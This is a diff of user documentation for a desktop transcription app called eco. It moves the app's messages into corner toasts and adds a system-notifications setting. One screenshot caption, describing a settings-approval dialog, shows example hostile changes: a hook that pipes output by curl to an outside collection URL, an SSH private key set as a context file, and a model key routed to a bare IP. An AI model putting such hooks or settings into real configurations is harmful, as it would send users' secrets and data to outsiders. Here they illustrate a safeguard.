@@ -128,12 +128,26 @@ glance says capture works before a session starts. The sentence under the
 buttons is literal: outside a session the audio is measured for this trace and
 nothing else.
 
-**No connection badge while things work.** Without the daemon the start
+**No connection warning while things work.** Without the daemon the start
 screen's masthead reads `OFFLINE`, its buttons dim, and the line under them
-says `Daemon disconnected · eco start`; every other screen shows a
-`DISCONNECTED` badge in its masthead. The window reconnects on its own.
+says `Daemon disconnected · eco start`; on every screen an error toast says the
+daemon is disconnected. It has no countdown: it stays while the daemon is
+unreachable and goes when the window reconnects, which it does on its own.
 
-![The start screen without the daemon: the masthead "ECO / OFFLINE"; the last input trace it drew, standing still; NEW SESSION, SESSIONS, IMPORT and PEOPLE dimmed; and under them, in amber, "Daemon disconnected · eco start".](img/02-disconnected.png)
+![The start screen without the daemon: the masthead "ECO / OFFLINE"; a flat dotted line where the input traces run; NEW SESSION, SESSIONS, IMPORT and PEOPLE dimmed; under them, in amber, "Daemon disconnected · eco start"; and in the bottom-right corner an error toast saying the daemon is disconnected, with its × button.](img/02-disconnected.png)
+
+**Messages are toasts.** What the window has to say — a setting saved, an
+answer copied, a refusal, an error — shows as a toast in its bottom-right
+corner, in the eco window and in the settings window alike, on every screen.
+In a session they stand above the composer; in the settings, inside the
+section's frame. Where the window is too short for all of them, the oldest
+wait out of sight, and the daemon's absence and the newest show. Each has an icon
+for its kind (a notice, a success, an error), its text, which wraps, and a
+`×` that closes it. Up to three show at once, the newest at the bottom; a
+fourth takes out the oldest. A notice or a success closes itself after about
+six seconds, but not while the pointer is over it or it has the keyboard; an
+error stays until you close it. `Tab` reaches each `×`, and `Esc` closes the
+toast that has the keyboard. A toast moves only as it comes and goes.
 
 **A newer release.** When the daemon has found a release newer than the one
 running and CHECK FOR UPDATES is on, the masthead shows a small lit notice,
@@ -254,7 +268,7 @@ outlasted the five minutes eco holds; it goes with the source's next line, or
 ten seconds later. A device that cannot be opened, or stops, reads
 `Device not heard · opening it again` on the same line, with why on hover,
 while the other sources go on; eco opens it again until it is heard. An error
-of the capture or its transcription on the status line — a capture that
+toast of the capture or its transcription — a capture that
 stopped, a line that could not be transcribed — goes when the last recording
 session ends or you leave the session, so the sessions list never shows it.
 Nothing here is a key or a button. The picture is the live
@@ -565,7 +579,7 @@ unless you are writing in a field, which keeps the digit; `Ctrl` with the
 number opens it anywhere in the window. The bar holds BACK first, then the main
 action, solid, on the left, and the other actions on the right, DELETE or
 DISCARD last, behind a thin rule. `×` in the top-right corner closes the
-window; the last message shows beside it while there is one.
+window; its messages are toasts in the bottom-right corner (section 1).
 
 A section is **a table**. A click picks a row; `↑` and `↓` move between rows.
 There are two kinds of row:
@@ -576,7 +590,7 @@ There are two kinds of row:
   or `Enter` or `Space` on the picked row, acts on it: it turns the switch,
   opens the dropdown, or starts writing, where `Enter` (or leaving the field)
   saves and `Esc` puts the value back. `Tab` reaches the control. A save the
-  daemon refuses leaves the value as it was, and the line at the top says why.
+  daemon refuses leaves the value as it was, and an error toast says why.
   AUDIO and GENERAL are made of these.
 - **An item with content** — a model, a session kind, a prompt, a context, a
   skill — **opens on a screen of its own**. A double click, or `Enter` or
@@ -796,7 +810,7 @@ version is the checkout's when it was taken, and the latest release is the
 same: the pictures never ask GitHub (the fixture sets `[update] check = false`),
 so the scene turns CHECK FOR UPDATES on and says the latest in the window only:
 
-![Settings, 08 GENERAL: an empty bar; the note says what the picked row does; a table SETTING · VALUE under five titles: INTERFACE with INTERFACE LANGUAGE, a dropdown "English (US)", picked, HIDE FROM SCREEN SHARING and SHOW ECO IN THE TRAY, each a dim OFF chip; REVIEWER with REVIEW ANSWERS, a dim OFF chip with claude-haiku beside it, and SHOW THE DRAFT, a dimmed OFF; AUDIO with DROP ECHOES, a lit ON, and ECHO CANCELLATION, a dim OFF; ANSWERS with MAXIMUM CONTEXT (CHARACTERS) 60000 and ANSWERS AT THE SAME TIME 8; UPDATES with CHECK FOR UPDATES, a lit ON, VERSION, a CHECK NOW button and "0.4.0 · up to date", and DAEMON, a RESTART button and "running".](img/53-settings-general.png)
+![Settings, 08 GENERAL: an empty bar; the note says what the picked row does; a table SETTING · VALUE under five titles: INTERFACE with INTERFACE LANGUAGE, a dropdown "English (US)", picked, HIDE FROM SCREEN SHARING, SHOW ECO IN THE TRAY and SYSTEM NOTIFICATIONS, each a dim OFF chip; REVIEWER with REVIEW ANSWERS, a dim OFF chip with claude-haiku beside it, and SHOW THE DRAFT, a dimmed OFF; AUDIO with DROP ECHOES, a lit ON, and ECHO CANCELLATION, a dim OFF; ANSWERS with MAXIMUM CONTEXT (CHARACTERS) 60000 and ANSWERS AT THE SAME TIME 8; UPDATES with CHECK FOR UPDATES, a lit ON, VERSION, a CHECK NOW button and "0.4.0 · up to date", and DAEMON, a RESTART button and "running".](img/53-settings-general.png)
 
 The note above the table says what the picked row does. There are no screens
 and no commands: each value saves at once.
@@ -806,7 +820,8 @@ and no commands: each value saves at once.
   `↑`, `↓`, `Enter` and `Esc` work in it, and the windows change language at
   once; see [i18n.md](i18n.md). HIDE FROM SCREEN SHARING is off by default; on,
   it applies to every eco window at once, and to each one that opens later.
-  SHOW ECO IN THE TRAY is off by default; see below.
+  SHOW ECO IN THE TRAY is off by default; see below. SYSTEM NOTIFICATIONS is
+  off by default; see below.
 - **REVIEWER.** REVIEW ANSWERS has a second model rewrite every answer before
   it shows; its value names the reviewer's model, picked on the Models table
   with DEFAULT FOR REVIEW. Turned on with no reviewer model picked, it takes
@@ -827,9 +842,9 @@ and no commands: each value saves at once.
   `0.4.0 · up to date`, `0.4.0 · not checked` or `0.4.0 · could not check`
   (the reason in the note) with CHECK NOW, or `0.4.0 · 0.5.0 available` with a
   lit UPDATE (`0.5.0` is an example). UPDATE installs the release; the row and
-  the masthead say each step — `downloading eco 0.5.0`, `checking the
+  a toast say each step — `downloading eco 0.5.0`, `checking the
   checksum of eco 0.5.0`, `installing eco 0.5.0`, `restarting eco`, `eco
-  0.5.0 is running` — or `update failed:` and why, in red. On Linux, `pkexec`
+  0.5.0 is running` — or `update failed:` and why, in an error toast. On Linux, `pkexec`
   asks for the password in its own window at installing. A session that
   records is never cut: the restart waits for it to end, and the row says
   `eco 0.5.0 installed · restarts when the session ends`. Then the window
@@ -838,6 +853,16 @@ and no commands: each value saves at once.
   session is recording. Restarting eco now stops its recording.", with CANCEL
   and RESTART. None of these steps is pictured. See [how to install and
   remove eco](how-to-install-and-remove.md#update).
+
+SYSTEM NOTIFICATIONS turned on has the daemon send a notification of the
+system — on Omarchy through `notify-send`, on Windows a Windows notification —
+while no eco window is active, and only for these: a source's transcription
+down, and back; a newer release, once per version; an answer finished, named
+by its skill or question, not its text; and an error the window would show as
+an error toast. While an eco window has the focus, its toasts say it and no
+notification is sent. Nothing else is notified. On Windows the notification
+is labelled "Windows PowerShell", not eco: eco registers no app id of its own.
+None is pictured: a notification is drawn by the system, not by eco.
 
 SHOW ECO IN THE TRAY turned on puts an icon in the system tray at once — on
 Omarchy the bar's tray, on Windows the notification area — and turned off, it
@@ -880,7 +905,7 @@ where its key comes from (never the key):
 
 ![The APPROVE THIS CHANGE dialog over a dimmed live session: "A program other than this window asked to change the settings. Approving saves it: a hook runs as a shell command after answers, a context file is sent to the model, and a model's key is sent to its address."; in red, "hook of minutes: curl -s --data-binary @- https://example.com/collect", "context file: ~/.ssh/id_ed25519" and "model fast: http://203.0.113.7/v1, key from $OPENROUTER_API_KEY"; REJECT and, filled red, APPROVE.](img/56-settings-pending.png)
 
-**APPROVE** saves the change; **REJECT** drops it, and the status line says it
+**APPROVE** saves the change; **REJECT** drops it, and a toast says it
 was rejected. Esc and a press outside do not close it. The keyboard starts on
 REJECT. The daemon keeps one held change at a time; while the dialog is open,
 no other program can change the settings, so what it lists does not change
